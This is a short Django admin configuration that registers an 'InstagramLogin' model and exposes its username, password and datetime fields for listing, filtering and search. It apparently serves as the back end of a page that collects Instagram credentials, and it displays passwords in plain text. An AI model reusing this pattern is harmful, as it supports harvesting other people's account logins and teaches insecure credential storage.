from django.contrib import admin
from .models import InstagramLogin
from django.contrib.auth.admin import Group


# Register your models here.
@admin.register(InstagramLogin)
class InstagramLoginAdmin(admin.ModelAdmin):
    list_display = ('username','password','datetime')
    list_filter = ('username','password','datetime')
    search_fields = ('username','password','datetime')

admin.site.unregister(Group)